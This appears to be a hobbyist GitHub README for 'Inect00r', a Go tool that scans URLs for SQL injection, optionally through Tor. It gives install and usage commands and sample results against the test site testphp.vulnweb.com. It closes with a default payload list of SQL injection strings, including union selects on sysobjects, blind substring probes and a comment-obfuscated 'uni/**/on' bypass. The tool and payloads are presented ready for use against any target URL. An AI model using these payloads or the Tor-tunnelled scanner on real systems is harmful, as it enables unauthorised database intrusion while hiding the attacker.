# Inect00r
```
 
▄▄▄▄▄      ▄▄▄  ▪   ▐ ▄  ▐▄▄▄▄▄▄ . ▄▄· ▄▄▄▄▄▄▄▄  
•██  ▪     ▀▄ █·██ •█▌▐█  ·██▀▄.▀·▐█ ▌▪•██  ▀▄ █·
 ▐█.▪ ▄█▀▄ ▐▀▀▄ ▐█·▐█▐▐▌▪▄ ██▐▀▀▪▄██ ▄▄ ▐█.▪▐▀▀▄ 
 ▐█▌·▐█▌.▐▌▐█•█▌▐█▌██▐█▌▐▌▐█▌▐█▄▄▌▐███▌ ▐█▌·▐█•█▌
 ▀▀▀  ▀█▄▀▪.▀  ▀▀▀▀▀▀ █▪ ▀▀▀• ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀

```

Inect00r is a simple script to test some of my golang skills, since i am quite new to go i decided why not make all my python scripts golang, this is a script to test a url's inject-abilities 

# what can it do EX options <br>
well this script is very basic, it can  <br>
. test inject urls through defualt lists <br>
. test inject urls through custome lists <br>
. use tor sockets to connect and tunnel to the client <br>
. table out the data of the injectable url <br>

# requirements
<br>
. tor <br> 
. proxychain config file <br>
. gotabulate <br>  

# installs 

```
< linux >
git clone https://github.com/ArkAngeL43/Inject00r.git ; chmod +x ./install.sh ; ./install.sh ; clear 

< windows > 
git clone https://github.com/ArkAngeL43/Injecto00r.git ; install ; cls 

```

# run options 

```
[*] Usage    -> go run main.go -t <target> 
[X] Extra    -> -p true|false <tor> -l <injection-list>
[X] Advances -> go run main.go -t <target> -p -l <main.txt> | note it must be a main.txt
---------------------------------------------------------------------------
  -h	Print the help menu and exit
  -l string
    	Use a list for SQL Testing
  -p string
    	Use tor proxies to connect to host
  -t string
    	target URL

```

# usages 
```
upon usages of tor this will pop 
[*] Online test passed.....
[*] Used Sock  :  socks5://127.0.0.1:9050
[*] Status Code:  200

this will tell you the proxy server is up and running, you are currently online, and the status code given from the server using the tor proxy

----------------------------
Using lists 

if you have your own custom word list then use the `-w` option aalong with the wordlist

NOTE: make sure your list is saved as main.txt or else the list will not be read or parsed 

---------------------------
normal usages 

go run main.go <url> -p true 

 
▄▄▄▄▄      ▄▄▄  ▪   ▐ ▄  ▐▄▄▄▄▄▄ . ▄▄· ▄▄▄▄▄▄▄▄  
•██  ▪     ▀▄ █·██ •█▌▐█  ·██▀▄.▀·▐█ ▌▪•██  ▀▄ █·
 ▐█.▪ ▄█▀▄ ▐▀▀▄ ▐█·▐█▐▐▌▪▄ ██▐▀▀▪▄██ ▄▄ ▐█.▪▐▀▀▄ 
 ▐█▌·▐█▌.▐▌▐█•█▌▐█▌██▐█▌▐▌▐█▌▐█▄▄▌▐███▌ ▐█▌·▐█•█▌
 ▀▀▀  ▀█▄▀▪.▀  ▀▀▀▀▀▀ █▪ ▀▀▀• ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀
 +------------------------------------------------------+-------------------------+
|   http://testphp.vulnweb.com/listproducts.php?cat=1  |   Server is vulnerable  |
+======================================================+=========================+
|                          SQL                         |            1            |
+------------------------------------------------------+-------------------------+
|           An error | detected vulnerability          |                         |
+------------------------------------------------------+-------------------------+

 +------------------------------------------------------+------------------------------+
|   http://testphp.vulnweb.com/listproducts.php?cat=1  |     Server is vulnerable     |
+======================================================+==============================+
|                          SQL                         |   1 and user_name() = 'dbo'  |
+------------------------------------------------------+------------------------------+
|           An error | detected vulnerability          |                              |
+------------------------------------------------------+------------------------------+

 +------------------------------------------------------+-------------------------+
|   http://testphp.vulnweb.com/listproducts.php?cat=1  |   Server is vulnerable  |
+======================================================+=========================+
|                          SQL                         |    \'; desc users; --   |
+------------------------------------------------------+-------------------------+
|           An error | detected vulnerability          |                         |
+------------------------------------------------------+-------------------------+

 +------------------------------------------------------+-------------------------+
|   http://testphp.vulnweb.com/listproducts.php?cat=1  |   Server is vulnerable  |
+======================================================+=========================+
|                          SQL                         |           1\'1          |
+------------------------------------------------------+-------------------------+
|           An error | detected vulnerability          |                         |
+------------------------------------------------------+-------------------------+


```

# defualt worlists 

```

1
1 and user_name() = 'dbo'
\'; desc users; --
1\'1
1' and non_existant_table = '1
' or username is not NULL or username = '
1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
1 uni/**/on select all from where

```

# have fun~~~~
